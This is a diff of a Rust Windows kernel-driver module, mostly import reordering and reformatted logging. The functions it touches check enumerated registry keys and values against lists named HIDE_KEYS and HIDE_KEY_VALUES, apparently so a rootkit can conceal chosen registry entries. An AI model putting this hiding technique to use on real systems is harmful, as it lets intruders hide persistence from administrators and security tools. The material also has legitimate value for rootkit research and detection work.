@@ -1,21 +1,16 @@
 #![allow(non_upper_case_globals)]
 
+use core::{ffi::c_void, mem::size_of, slice::from_raw_parts};
 use wdk_sys::*;
 use wdk_sys::{
-    ntddk::{ZwEnumerateKey, ZwEnumerateValueKey},
     _KEY_INFORMATION_CLASS::{KeyBasicInformation, KeyNameInformation},
     _KEY_VALUE_INFORMATION_CLASS::{
-        KeyValueBasicInformation, KeyValueFullInformation, 
-        KeyValueFullInformationAlign64,
+        KeyValueBasicInformation, KeyValueFullInformation, KeyValueFullInformationAlign64,
     },
-};
-use core::{
-    ffi::c_void, 
-    mem::size_of, 
-    slice::from_raw_parts
+    ntddk::{ZwEnumerateKey, ZwEnumerateValueKey},
 };
 
-use super::{Registry, HIDE_KEYS, HIDE_KEY_VALUES};
+use super::{HIDE_KEY_VALUES, HIDE_KEYS, Registry};
 use alloc::{format, string::String};
 
 /// Checks if a specified registry key is present in the list of hidden keys.
@@ -45,12 +40,21 @@ pub unsafe fn check_key(info: *mut REG_POST_OPERATION_INFORMATION, key: String) 
                 ((*basic_information).NameLength / size_of::<u16>() as u32) as usize,
             );
             let full_key = format!("{}\\{}", key, String::from_utf16_lossy(name_slice));
-            log::debug!("check_key: Constructed full key (BasicInformation): '{}'", full_key);
+            log::debug!(
+                "check_key: Constructed full key (BasicInformation): '{}'",
+                full_key
+            );
             if Registry::check_key(full_key.clone(), HIDE_KEYS.lock()) {
-                log::info!("check_key: Registry::check_key returned true for '{}'", full_key);
+                log::info!(
+                    "check_key: Registry::check_key returned true for '{}'",
+                    full_key
+                );
                 return true;
             } else {
-                log::debug!("check_key: Registry::check_key returned false for '{}'", full_key);
+                log::debug!(
+                    "check_key: Registry::check_key returned false for '{}'",
+                    full_key
+                );
             }
         }
         KeyNameInformation => {
@@ -60,12 +64,21 @@ pub unsafe fn check_key(info: *mut REG_POST_OPERATION_INFORMATION, key: String) 
                 ((*name_info).NameLength / size_of::<u16>() as u32) as usize,
             );
             let full_key = format!("{}\\{}", key, String::from_utf16_lossy(name_slice));
-            log::debug!("check_key: Constructed full key (NameInformation): '{}'", full_key);
+            log::debug!(
+                "check_key: Constructed full key (NameInformation): '{}'",
+                full_key
+            );
             if Registry::check_key(full_key.clone(), HIDE_KEYS.lock()) {
-                log::info!("check_key: Registry::check_key returned true for '{}'", full_key);
+                log::info!(
+                    "check_key: Registry::check_key returned true for '{}'",
+                    full_key
+                );
                 return true;
             } else {
-                log::debug!("check_key: Registry::check_key returned false for '{}'", full_key);
+                log::debug!(
+                    "check_key: Registry::check_key returned false for '{}'",
+                    full_key
+                );
             }
         }
         1 => {
@@ -75,17 +88,25 @@ pub unsafe fn check_key(info: *mut REG_POST_OPERATION_INFORMATION, key: String) 
                 ((*name_info).NameLength / size_of::<u16>() as u32) as usize,
             );
             let full_key = format!("{}\\{}", key, String::from_utf16_lossy(name_slice));
-            log::debug!("check_key: Constructed full key (NodeInformation): '{}'", full_key);
+            log::debug!(
+                "check_key: Constructed full key (NodeInformation): '{}'",
+                full_key
+            );
             if Registry::check_key(full_key.clone(), HIDE_KEYS.lock()) {
-                log::info!("check_key: Registry::check_key returned true for '{}'", full_key);
+                log::info!(
+                    "check_key: Registry::check_key returned true for '{}'",
+                    full_key
+                );
                 return true;
             } else {
-                log::debug!("check_key: Registry::check_key returned false for '{}'", full_key);
+                log::debug!(
+                    "check_key: Registry::check_key returned false for '{}'",
+                    full_key
+                );
             }
         }
         other => {
             log::warn!("check_key: Unknown KeyInformationClass: {}", other);
-            
         }
     }
     log::debug!("check_key: Returning false for base key '{}'", key);
@@ -109,23 +130,36 @@ pub unsafe fn check_key_value(info: *mut REG_POST_OPERATION_INFORMATION, key: St
     log::debug!("check_key_value: Called with base key '{}'", key);
     let info_class = (*info).PreInformation as *const REG_ENUMERATE_VALUE_KEY_INFORMATION;
     let kv_info_class = (*info_class).KeyValueInformationClass;
-    log::debug!("check_key_value: KeyValueInformationClass = {}", kv_info_class);
+    log::debug!(
+        "check_key_value: KeyValueInformationClass = {}",
+        kv_info_class
+    );
 
     match kv_info_class {
         KeyValueBasicInformation => {
-            let value_info = (*info_class).KeyValueInformation as *const KEY_VALUE_BASIC_INFORMATION;
+            let value_info =
+                (*info_class).KeyValueInformation as *const KEY_VALUE_BASIC_INFORMATION;
             let name_slice = from_raw_parts(
                 (*value_info).Name.as_ptr(),
                 ((*value_info).NameLength / size_of::<u16>() as u32) as usize,
             );
             let value_name = String::from_utf16_lossy(name_slice);
             let full_key = format!("{}\\{}", key, value_name);
-            log::debug!("check_key_value: Constructed full key (BasicInformation): '{}'", full_key);
+            log::debug!(
+                "check_key_value: Constructed full key (BasicInformation): '{}'",
+                full_key
+            );
             if Registry::check_target(key.clone(), value_name.clone(), HIDE_KEY_VALUES.lock()) {
-                log::info!("check_key_value: Registry::check_target returned true for '{}'", full_key);
+                log::info!(
+                    "check_key_value: Registry::check_target returned true for '{}'",
+                    full_key
+                );
                 return true;
             } else {
-                log::debug!("check_key_value: Registry::check_target returned false for '{}'", full_key);
+                log::debug!(
+                    "check_key_value: Registry::check_target returned false for '{}'",
+                    full_key
+                );
             }
         }
         KeyValueFullInformationAlign64 | KeyValueFullInformation => {
@@ -136,16 +170,26 @@ pub unsafe fn check_key_value(info: *mut REG_POST_OPERATION_INFORMATION, key: St
             );
             let value_name = String::from_utf16_lossy(name_slice);
             let full_key = format!("{}\\{}", key, value_name);
-            log::debug!("check_key_value: Constructed full key (FullInformation): '{}'", full_key);
+            log::debug!(
+                "check_key_value: Constructed full key (FullInformation): '{}'",
+                full_key
+            );
             if Registry::check_target(key.clone(), value_name.clone(), HIDE_KEY_VALUES.lock()) {
-                log::info!("check_key_value: Registry::check_target returned true for '{}'", full_key);
+                log::info!(
+                    "check_key_value: Registry::check_target returned true for '{}'",
+                    full_key
+                );
                 return true;
             } else {
-                log::debug!("check_key_value: Registry::check_target returned false for '{}'", full_key);
+                log::debug!(
+                    "check_key_value: Registry::check_target returned false for '{}'",
+                    full_key
+                );
             }
         }
         2 => {
-            let value_info = (*info_class).KeyValueInformation as *const KEY_VALUE_PARTIAL_INFORMATION;
+            let value_info =
+                (*info_class).KeyValueInformation as *const KEY_VALUE_PARTIAL_INFORMATION;
             if value_info.is_null() {
                 log::error!("check_key_value: KEY_VALUE_PARTIAL_INFORMATION pointer is null");
                 return false;
@@ -157,18 +201,29 @@ pub unsafe fn check_key_value(info: *mut REG_POST_OPERATION_INFORMATION, key: St
             let name_slice = from_raw_parts(data_ptr, num_chars);
             let value_name = String::from_utf16_lossy(name_slice);
             let full_key = format!("{}\\{}", key, value_name);
-            log::debug!("check_key_value: Constructed full key (PartialInformation): '{}'", full_key);
+            log::debug!(
+                "check_key_value: Constructed full key (PartialInformation): '{}'",
+                full_key
+            );
             if Registry::check_target(key.clone(), value_name.clone(), HIDE_KEY_VALUES.lock()) {
-                log::info!("check_key_value: Registry::check_target returned true for '{}'", full_key);
+                log::info!(
+                    "check_key_value: Registry::check_target returned true for '{}'",
+                    full_key
+                );
                 return true;
             } else {
-                log::debug!("check_key_value: Registry::check_target returned false for '{}'", full_key);
+                log::debug!(
+                    "check_key_value: Registry::check_target returned false for '{}'",
+                    full_key
+                );
             }
         }
-        
+
         other => {
-            log::warn!("check_key_value: Unknown KeyValueInformationClass: {}", other);
-            
+            log::warn!(
+                "check_key_value: Unknown KeyValueInformationClass: {}",
+                other
+            );
         }
     }
     log::debug!("check_key_value: Returning false for base key '{}'", key);
@@ -216,7 +271,11 @@ pub unsafe fn enumerate_key(
     }
 
     if !NT_SUCCESS(status) {
-        log::error!("enumerate_key: ZwEnumerateKey failed with status: {} at index {}", status, index);
+        log::error!(
+            "enumerate_key: ZwEnumerateKey failed with status: {} at index {}",
+            status,
+            index
+        );
         return None;
     }
 
@@ -228,7 +287,10 @@ pub unsafe fn enumerate_key(
                 ((*basic_information).NameLength / size_of::<u16>() as u32) as usize,
             );
             let key_name = String::from_utf16_lossy(name_slice);
-            log::debug!("enumerate_key: Enumerated key (BasicInformation): '{}'", key_name);
+            log::debug!(
+                "enumerate_key: Enumerated key (BasicInformation): '{}'",
+                key_name
+            );
             Some(key_name)
         }
         KeyNameInformation => {
@@ -238,7 +300,10 @@ pub unsafe fn enumerate_key(
                 ((*name_information).NameLength / size_of::<u16>() as u32) as usize,
             );
             let key_name = String::from_utf16_lossy(name_slice);
-            log::debug!("enumerate_key: Enumerated key (NameInformation): '{}'", key_name);
+            log::debug!(
+                "enumerate_key: Enumerated key (NameInformation): '{}'",
+                key_name
+            );
             Some(key_name)
         }
         other => {
@@ -289,7 +354,11 @@ pub unsafe fn enumerate_value_key(
     }
 
     if !NT_SUCCESS(status) {
-        log::error!("enumerate_value_key: ZwEnumerateValueKey failed with status: {} at index {}", status, index);
+        log::error!(
+            "enumerate_value_key: ZwEnumerateValueKey failed with status: {} at index {}",
+            status,
+            index
+        );
         return None;
     }
 
@@ -301,11 +370,17 @@ pub unsafe fn enumerate_value_key(
                 (value_info.NameLength / size_of::<u16>() as u32) as usize,
             );
             let value_name = String::from_utf16_lossy(name_slice);
-            log::debug!("enumerate_value_key: Enumerated value key: '{}'", value_name);
+            log::debug!(
+                "enumerate_value_key: Enumerated value key: '{}'",
+                value_name
+            );
             Some(value_name)
         }
         other => {
-            log::warn!("enumerate_value_key: Unknown key_value_information class: {}", other);
+            log::warn!(
+                "enumerate_value_key: Unknown key_value_information class: {}",
+                other
+            );
             None
         }
     }
